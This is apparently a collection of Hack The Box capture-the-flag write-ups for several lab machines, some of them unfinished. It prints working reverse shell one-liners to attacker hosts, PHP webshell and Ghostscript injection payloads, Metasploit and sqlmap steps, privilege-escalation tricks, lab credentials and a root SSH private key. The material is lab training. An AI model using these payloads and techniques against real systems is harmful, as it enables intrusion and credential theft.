# Medium\_machines

##

## OnlyForYou

> To obtain access we must read various files on the web using an LFI to find a vulnerability in the form. Using the form we can run CERs. To move to a user we must perform a Cypher Injection on an internal website to get the password. And for the escalation of privileges we must modify a file, create a tar.gz and upload it to the Gogs web intera and then download the file using pip3 and thus be able to modify the bash to SUID permissions.

### Reco

1. nmap 10.10.11.210 -sVC
2. dir busting
   * there is a subdomain ![](https://hackmd.io/_uploads/rytoaqich.png)
   * add it also to the /etc/hosts

### Weaponisation

1. beta subdomain
   * allows us to download source code ![](https://hackmd.io/_uploads/BklH0qoqh.png)
     * When analyzing it we realize that in the / download path if in the parameter image start with 2 points then launch a message that says Hacking detected and makes us a redirect to / list. ![](https://hackmd.io/_uploads/HkT9C5iq3.png)

### Exploitation

1.

### User flag

### Root flag

## Format

### Reco

1. nmap: `nmap -sVC 10.10.11.213`
   * 22 SSH
   * 80,3000 HTTP
2. add microblog.htb:3000 to /etc/hosts
3. FUZZING - subdomain enumeration
   * app, sunny
     * add these both to /etc/hosts also
4. Website
   * "Contribute here!" in footer -> source code of app.microblog.htb

### Weaponisation

1. LFI
   * we can use ID parameter for LFI
     * create a blog -> edit blog
       * capture req to add the H1/text
         * we can edit the ID paramater for LFI ![](https://hackmd.io/_uploads/SkOVqn0q2.png)

### Exploitation

1. PRO account
   * dashboard page and source code -> something about PRO
   * assign pro to our session using SSRF

> curl -X "HSET" http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:testy%20pro%20true%20a/b

* insert the username of registration

2. Uploading reverse shell
   * use this to get RS on target machine + change your blog name

> id=/var/www/microblog/\<your\_blog\_name>/uploads/rev.php\&header=<%3fphp+echo+shell\_exec("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.14.30+443+>/tmp/f")%3b%3f> ![](https://hackmd.io/_uploads/rJj-j309h.png)

* after visiting the /uploads/rev.php we will get our RS

### User flag

1. Connect to Redis-cli
   * socks config file
     * redis-cli -s /var/run/redis/redis.sock
     * keys \* ![](https://hackmd.io/_uploads/SyLwo205h.png)
     * hgetall cooper.dooper
       * `cooper:zooperdoopercooper`
2. SSH connect to obtain user flag

### Root flag

1. trying `sudo -l`
   * we can run /usr/bin/licence
     * this file is also readable
       * [Python format function vuln](https://web.archive.org/web/20230624063634/https://podalirius.net/en/articles/python-format-string-vulnerabilities/)
2. Vuln
   * register a user using redis-cli and use the vuln in username to print all variables
     * `HSET test2 username test1 password test first-name`
     * `{license.__init__.__globals__} last-name test pro false` ![](https://hackmd.io/_uploads/S1LOThRq3.png)
   * run /usr/bin/licence as sudo to provision the licence of our "test2" user
     * `sudo /usr/bin/license -p test2` ![](https://hackmd.io/_uploads/Hy_na3Rc2.png)
       * we obtained SSH credentials for root
         * `root:unCR4ckaBL3Pa$$w0rd`
3. SSH login as a root to obtain root flag

## Download

### Reco

* `sudo nmap -sVC <IP>`
  * ![](https://hackmd.io/_uploads/SkZBpNRo3.png)
  * 22 SSH
  * 80 HTTP
    * redirect -> add download.htb to /etc/hosts
* website analysis
  * website for uploading && downloading large files
  * upload subsite
    * download.htb/files/upload
  * login && register subsite
    * downlaod.htb/auth/login
    * download.htb/auth/register

### Weaponisation

1. while trying to upload a file with BurpSuite, I found out tha it is an **Express** based website - upload the file -> we obtain unique UID and link ![](https://hackmd.io/_uploads/H1ZfZSRo3.png) - click "Copy Link" button -> small popup window followed by an alert - it is a file called copy.js (contains the code for the function, nothing vulnerable) - there is also a JWT token withing the download + a .sig cooke ![](https://hackmd.io/_uploads/HyJBZrAj3.png) - decoded token: `{"flashes":{"info":[],"error":[],"success":[]}}`
   * Download feature
     * redirects us to the link:
       * `http://download.htb/files/download/0623ba64-6749-48a4-9a08-a58658b74852`
         * this could be used to download other files...
         * uploads are probably stored within a /downloads or /uploads folder on the machine
           * basic LFI with some Express file names...
             * `..%2fapp.js` worked... ![](https://hackmd.io/_uploads/HJMYk8Cjn.png)
               * there is package.json as part of the folders too: `{ "name": "download.htb", "version": "1.0.0", "description": "", "main": "app.js", "scripts": { "test": "echo \"Error: no test specified\" && exit 1", "dev": "nodemon --exec ts-node --files ./src/app.ts", "build": "tsc" }, "keywords": [], "author": "wesley", "license": "ISC", "dependencies": { "@prisma/client": "^4.13.0", "cookie-parser": "^1.4.6", "cookie-session": "^2.0.0", "express": "^4.18.2", "express-fileupload": "^1.4.0", "zod": "^3.21.4" }, "devDependencies": { "@types/cookie-parser": "^1.4.3", "@types/cookie-session": "^2.0.44", "@types/express": "^4.17.17", "@types/express-fileupload": "^1.4.1", "@types/node": "^18.15.12", "@types/nunjucks": "^3.2.2", "nodemon": "^2.0.22", "nunjucks": "^3.2.4", "prisma": "^4.13.0", "ts-node": "^10.9.1", "typescript": "^5.0.4" } }`
         * AUTHOR: **WESLEY**
2. enumerating LOGIN
   * create a test user && login -> download\_session cookie has some more information (decoded): `{"flashes":{"info":[],"error":[],"success":[]},"user":{"id":16,"username":"test123"}}`
   * .sig token is also different
     * signature of a cookie, changes by the extension
3. VULN for COOKIE on websites running Express
   * [cookie-monster](https://github.com/DigitalInterruption/cookie-monster)
   * [nodeJS Express](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nodejs-express)

### Exploitation

1. Blind injection - Cookie monster Brute Force Lets sum up all facts we obtained:
   * **.sig** ... key for the token structure, needed fot Cookie Monster
   * User is **wesley**, hashes are UNsalted and used directly for auth -> brute forcing could be a way
   * there is **SQL query** that is somehow injectable
   * **cookies are not validated** any way -> it checks whether a `true` condition is returned from `findFirst` from the `prisma` API module...Blind Injection by redirect could be possibility

## Manager

### Reco

nmap -sVC 10.10.11.236 -Pn - 53 DOMAIN (Simple DNS Plus) - 80 HTTP (MS IIS httpd 10.0) - 88 KERBEROS-SEC - 135 MSRPC - 139 NETBIOS-SSN - 389 LDAP - ssl-cert: dc01.manager.htb - 445 MS-DS? - 464 KPASSWD5? - 593 NCACN\_HTTP (RMS win RPC over HTTP 1.0) - 636 SSL/LDAP - DNS: dc01.manager.htb - 1433 MS-SQL-S - MSSQL Server 2019 - 3269 LDAP - 3269 SSL/LDAP - active SMB2 - sec-mode: 311 (message signing enabled and required)

## Zipping

### Reco

#### Nmap&#x20;

`nmap -sVC 10.10.11.229 -Pn`

* 22 SSH (OpenSSH, Ubuntu, protocol 2.0)
* 80 HTTP (Apache httpd 2.4.54, no redirect)

#### Website

* Watch store
* Contact form, Work w us (**upload file**), Shop w cart features

#### Dir busting

`dirb http://10.10.11.229`

* /assets
* /shop
  * /shop/assets
  * /shop/index.php
* /uploads

### Weaponisation

#### Bootstrap

[http://10.10.11.229](http://10.10.11.229/upload.php)/assets

* [http://10.10.11.229/assets/scss/vendors/](http://10.10.11.229/assets/scss/vendors/)
  * bootstrap 4.3.1 from 2019
    * vuln to XSS
    * CVE-2019-8331

#### File upload&#x20;

* we have to upload ZIP file containing PDF
  * PDF can be for example custom made php revesre shell script...

### Exploitation

#### Reverse shell

* [https://www.revshells.com/](https://www.revshells.com/)
* IP & port
  * sh -i >& /dev/tcp/\<IP>/\<PORT> 0>&1
* Final Payload for shell.php file
  *   **`<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.12/4444 0>&1'") ?>`**

      <figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

#### Craft ZIP+PDF from php script

`mv shell.php shell.phpA.pdf`

`zip zip.zip shell.phpA.pdf`

`hexedit zip.zip`

* change phpA.pdf -> change A char to 0
  * hex: **41 -> 00**
  *

      <figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

upload file & go to generated URL with removed .pdf extension (onlyhttp://......./shell.php)

reserse shell should be obtained in nc -nlvp \<PORT>

### User flag

* Craft the pdf file with base64 encoded command for cat of user.txt...
*

### Root flag

## Hospital

### Reco

#### nmap

`nmap 10.10.11.241 -sVC`

* 22 SSH
* 53 Domain - Simple DNS Plus
* 88 Kerberos-sec
* 135,2103,2105 MSRPC
* 139 Netbios-ssn
* 389,3268 LDAP
* 443 HTTPS
* .....
* 3389 MS-WBT-Server
* 8080 HTTP
  * PHPSESSID = httponly flag not set
  * potentially OPEN proxy
* Host script results
  * smb2
    * sec-mode 311 (message signing enabled and required)

#### Redirect

`sudo nano /etc/hosts`

* 10.10.11.241 hospital.htb

#### Website

<figure><img src="../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption><p>https://10.10.11.241/</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (12) (1) (1) (1).png" alt=""><figcaption><p>http://10.10.11.241:8080</p></figcaption></figure>

### Weaponisation

#### Register & Login

* 10.10.14.241:8080
  * Register & Login
    * I created: Tester:testtest

#### Upload page

<figure><img src="../.gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption><p>10.10.11.241:8080/index.php</p></figcaption></figure>

#### dirb

dirb http://10.10.11.241:8080/ /usr/share/wordlists/dirb/common.txt

* /css
* /fonts
* /images
* /js
* /l
* /m
* /u
* **/uploads**
* /vendor
* /w

Uploads subpage is important for us. When we upload a file, we can access it via 10.10.11.241:8080/uploads/\<file>

### Exploitation

#### p0wnyshell Tool

* git clone https://github.com/flozz/p0wny-shell
* after cloning, copy php file into phar extension
  * cp shell.php shell.phar
*   upload shell.phar to 10.10.11.241:8080/uploads

    * success
    * redirect to: 10.10.11.241:8080/uploads/shell.phar
      * we have browser Reverse shell

    <figure><img src="../.gitbook/assets/image (14) (1) (1) (1).png" alt=""><figcaption><p>10.10.11.241:8080/uploads/shell.phar</p></figcaption></figure>

#### Reverse Shell crafting

`sh -i >& /dev/tcp/<IP>/<PORT> 0>&1`

* base64 encode
  * `c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMy80NDQ0IDA+JjE=`
* whole command for webshell
  * `echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMy80NDQ0IDA+JjE= | base64 -d | bash`
  * we dont have permissions to directly start sh command, but we can echo it under base64

`echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMy80NDQ0IDA+JjE= | base64 -d | bash`

`nc -nlvp 4444`

* we obtained reverse shell
  * `python3 -c 'import pty;pty.spawn("/bin/bash")'`
  * `export TERM=xterm`
  * `stty raw -echo; fg`

`There is a user drwilliams`

`/etc/shadow`

* we dont have permissions to read shadow file
  * uname -r
    * Ubuntu (Linux) v5.19
      * EXPLOIT: [https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)
        * upload this sh file into reverse shell
        * chmod u+x
        * run (./exploit.sh)
        * we obtained root privileges
* cat /etc/shadow

<figure><img src="../.gitbook/assets/image (16) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Decode the PW hash

### User flag

#### drwilliams login

ssh drwilliams@10.10.11.241

* PW: qwe123!@#
* unfortunatelly, no FLAG found

{% embed url="https://10.10.11.241" %}

`drwilliams:qwe123!@#`

<figure><img src="../.gitbook/assets/image (15) (1) (1) (1).png" alt=""><figcaption><p>drwilliams Inbox</p></figcaption></figure>

* there are .eps attachments
* drbrown says sth about GhostScript
  * lets craft malicious one
    * [https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection)
      * Ghostscript command injection

#### Path traversal to drbrown&#x20;

1. UPLOAD EXPLOIT TO TARGET MACHINE

* `git clone https://github.com/int0x33/nc.exe/`
  * `cd nc.exe`
* Prepare http.server for serving our exploit
  * `python3 -m http.server 8083`

<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

* Craft .eps Exploit
  * `python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.14.7:8083/nc64.exe -o nc.exe" --filename file.eps`

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

* upload it via email attachment (.eps file) answering to drbrown email...
  * phishing

<figure><img src="../.gitbook/assets/image (18) (1) (1).png" alt=""><figcaption><p>upload it via answered email to drbrown</p></figcaption></figure>

* we successfully served nc.exe to our http.server

<figure><img src="../.gitbook/assets/image (20) (1) (1).png" alt=""><figcaption></figcaption></figure>

2. OBTAIN REVERSE SHELL

* Crafted second file.eps exploit with netcat port...
  * `python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.7 4444 -e cmd.exe" --filename file.eps`

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

* `nc -nlvp 4444`

<figure><img src="../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

* upload exploit via answering email

<figure><img src="../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

* we have a reverse shell to user DRBROWN

<figure><img src="../.gitbook/assets/image (22) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### drbrown credentials

* `dir`
* `type ghostscript.bat`

<figure><img src="../.gitbook/assets/image (24) (1).png" alt=""><figcaption><p>obtaining PW of user drbrown</p></figcaption></figure>

#### connect via RDP

REMINNA&#x20;

* user: drbrown&#x20;
* IP: 10.10.11.241
* PW: chr!$br0wn

<figure><img src="../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>

### Root flag

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption><p>/xampp/htdocs is writeable</p></figcaption></figure>

we can see there is uploaded shell.php



<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

access website uploaded file...

<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

<mark style="color:red;">**PWNED <3**</mark>

## Surveillance

### Reco

#### nmap

`nmap -sVC 10.10.11.245`

* 22 SSH
* 80 HTTP
  * add to /etc/hosts

<figure><img src="../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

#### website

* footer
  * Craft CMS v4.4.14

#### dirb

dirb http://surveillance.htb/

* /.htaccess
* /admin
  * redirect to -> /admin/login
* /css
* /fonts
* /images
* /img
  * /index
  * /index.php
* /js
  * /logout
  * /web.config
  * /wp-admin
*

### Weaponisation

#### Craft CMS

* VULN v4.4.14
  * [https://putyourlightson.com/articles/critical-craft-cms-security-vulnerability](https://putyourlightson.com/articles/critical-craft-cms-security-vulnerability)
  * **CVE-2023-41892**
  * critical vuln -> **RCE attacks**
    * exploit is in the public domain
    * can be exploited anonymously
    * high severity and low complexity
    * For Craft v 4.0.0-4.4.14
    * RESULT -> malicious code run on the server to steal sensitive data
  * [https://blog.calif.io/p/craftcms-rce](https://blog.calif.io/p/craftcms-rce)

### Exploitation

#### Exploit

* [https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226](https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226)
* nano CVE-2023-41892.py
  * edit the original code
    * ...

### User flag

#### Obtain user credentials

* /html/craft/storage/backups
  *   matthew - bcrypt hash

      * 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec
      * hashcat

      <figure><img src="../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

#### SSH

`ssh matthew@10.10.11.245`

* PW: **starcraft122490**
* `cat user.txt`

### Root flag

#### Path traversal #1 (Matthew -> ZoneMinder)

\
1\) Port forward 8080 to your machine\
&#x20;  a) you can use ssh to portforward, but I´m gonna use chisel.\
&#x20;  [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
\
&#x20;  b) run chisel server at attacker's machine`./chisel server --port 1337 --reverse --socks5`\
&#x20;  c) transfer chisel to victim's pc\
&#x20;     i) host local server at attacker's machine`python -m http.server 8888`      ii) at matthew's ssh session`wget <your ip>:8888/chisel`      iii) still at matthew's ssh allow for execute (sanity check)`chmod +x chisel`      iv) establish connection to your chisel server`./chisel client <your ip>:1337 R:<whatever port you wish to forward here>:127.0.0.1:8080 &`\
&#x20;  d) open up your browser and access [http://127](http://0.0.0.127/).0.0.1:\<whatever port you forwarded previously at step c-iv> (you should see zoneminder cms)\
\
2\) launch msfconsole\
`msfconsole`

3\) use the exploit\
`use exploit/unix/webapp/zoneminder_snapshots`

4\) set victim's ip -> in this case it would be the machine's ip\
`set RHOSTS <victim ip>`

5\) set victim's port -> in this case it will be port you forwarded in step 1 above\
`set RPORT <victim port>`

6\) set attacker's ip -> this means your ip\
`set LHOST <your ip>`

7\) set the target path -> in this case it's just /\
`set TARGETURI /`

8\) literally just type exploit \
`exploit`

9\) meterpreter session will be established here get a shell\
`shell`\


#### Path Travesral #2 (zoneminder -> root)

1\) rev.sh file (place this at /tmp) :\
`#!/bin/bash`\
`busybox nc 10.10.xx.xx 443 -e sh`

\
2\) open a listener at port 443\
\
3\) run this as zoneminder user\
`sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/rev.sh)' --pass=ZoneMinderPassword2023`

`cd /root && cat root.txt`

<mark style="color:red;">**PWNED <3**</mark>\




## Monitored

### Reco

#### nmap

`nmap -sVC 10.10.11.248`

* 22 SSH
* 80 HTTP -> redirect: nagios.monitored.htb
* 389 LDAP (OpenLDAP v2.2.X-2.3.X)
* 443 SSL

<figure><img src="../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

#### /etc/hosts

* sudo nano /etc/hosts

#### website

<figure><img src="../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>

* Default credentials
  * root:nagiosxi
    * not working
  * root:welcome
    * not working
* Nagios subpage
  * Nagios Core
    * [https://nagios.monitored.htb/nagios/](https://nagios.monitored.htb/nagios/)
    * v 4.4.13 Nagios XI

### Weaponisation

#### snmpwalk

sudo apt install snmp

**`snmpwalk -v2c -c public monitored.htb`**

<figure><img src="../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>

* svc:XjH7VCehowpR1xZB
  * not working, but could be useful in the future
* some user laurel
* **Authentication via API for user svc**

```
curl -POST -k 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=500'
```

<figure><img src="../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

OK, we obtained auth\_token of user svc

* `cf6962b52462e86aceb1a17056adfd695e474034`

### Exploitation

NagiosXI v4.4.13

* CVE - VULN
  * [https://nvd.nist.gov/vuln/detail/CVE-2023-40931](https://nvd.nist.gov/vuln/detail/CVE-2023-40931)
  * A SQL injection vulnerability in Nagios XI from version 5.11.0 up to and including 5.11.1 allows authenticated attackers to execute arbitrary SQL commands via the ID parameter in the POST request to /nagiosxi/admin/banner\_message-ajaxhelper.php

`sqlmap -u "https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d "username=svc&password=XjH7VCehowpR1xZB&valid_min=500" | awk -F'"' '{print$12}'" --level 5 --risk 3 -p id --batch -D nagiosxi --dump`



* The admin hash looks like bcrypt, but the API key is close
* Using it, we will add a new user with administrator rights
  * admin007 could sound cool

```
curl -k "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=admin007&password=admin007&name=Admin007&email=admin007@localhost&auth_level=admin"
```

<figure><img src="../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

LOGIN via admin007

<figure><img src="../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>

Change PW of original admin

* **`nagiosadmin:hacked`**
* `SSH still not working...`

<figure><img src="../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

### User flag

Gaining reverse shell access

{% embed url="https://nagios.monitored.htb/nagiosxi/includes/components/ccm/xi-index.php" %}

<figure><img src="../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

* add new command
  * [https://www.revshells.com/](https://www.revshells.com/)
  * **`bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'`**
  *

      <figure><img src="../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>


  * Do not forget to click on Apply settings.&#x20;
  * Go to our host **`https://nagios.monitored.htb/nagiosxi/includes/components/ccm/?cmd=modify&type=host&id=1&page=1&returnUrl=index.php%3Fcmd%3Dview%26type%3Dhost%26page%3D1`**&#x20;
    * to the right, select our commands sequentially, then click Run command check.

<figure><img src="../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

### Root flag

{% embed url="https://github.com/jakgibb/nagiosxi-root-rce-exploit" %}

sudo -l

<figure><img src="../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

`cd /usr/local/nagiosxi/scripts/components`

`cat getprofile.sh`

<figure><img src="../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

#### obtaining id\_rsa file

Let's check the rights of the /usr/local/nagios/etc/nagios.cfg file:

```
ls -la /usr/local/nagios/etc/nagios.cfg 
```

<figure><img src="../.gitbook/assets/image (114).png" alt=""><figcaption><p>we can edit this file</p></figcaption></figure>

We correct the log\_file parameter as follows:

`log_file=/root/.ssh/id_rsa`

Now let's start the backup:

```
sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1
```

<figure><img src="../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

After execution, you should see the file **/usr/local/nagiosxi/var/components/profile.zip**, which you should unzip and find the file nagios-logs/**`nagios.txt,`** which will contain the **root user's private key.** Let's save it and log in.

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

#### SSH login as root

`nano id_rsa`

`chmod 600 id_rsa`

`ssh -i id_rsa root@monitored.htb`

`ls`

`cat root.txt`

<figure><img src="../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>

## POV

### Reco

**nmap**

`nmap -sVC 10.10.11.251`

<figure><img src="../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

**/etc/hosts**

* `sudo nano /etc/hosts`
* 10.10.11.251 pov.htb

**Website**

* FOOTER
  * dev.pov.htb
  * user: sfitz
  *

      <figure><img src="../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

**Fuzzing - nothing interesting**

* ffuf -u http://pov.htb/FUZZ -w /home/zihuatanejo/Desktop/Tools/SecLists/Discovery/Web-Content/common.txt
*

    <figure><img src="../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>

### Weaponisation

**dev subpage**

* dev.pov.htb
*

    <figure><img src="../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>


* there is CV.pdf for download
*

    <figure><img src="../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>


* we can try to change the file with reverse shell payload...

### Exploitation

**Burp Download button investigation**

*

    <figure><img src="../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>


*   Finding the exploit for VIEWSTATE which is response for downloading button...

    * [https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-\_\_viewstate-parameter?source=post\_page-----7516c938c688--------------------------------](https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter?source=post_page-----7516c938c688--------------------------------)
      * **ViewState** is the method that the ASP.NET framework uses by default to p**reserve page and control values between web pages**. When the HTML for the page is rendered, the current state of the page and values that need to be retained during postback are serialized into base64-encoded strings and output in the ViewState hidden field or fields.
    * try changing filename from cv.pdf to some sensitive info...
      * filename -> /web.config

    <figure><img src="../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>
* we obtained keys below:
  * decryption="**AES**"
    * decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"&#x20;
  * validation="**SHA1**"
    * validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
* generate reverse shell for powershell
  * RSforPS.py

```python
#!/usr/bin/env python3
#generate reverse powershell cmdline with base64 Encoding
import sys import base64
def help(): print("USAGE: %s IP PORT" % sys.argv[0]) print("Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT") exit()
try: (ip, port) = (sys.argv[1], int(sys.argv[2])) except: help()
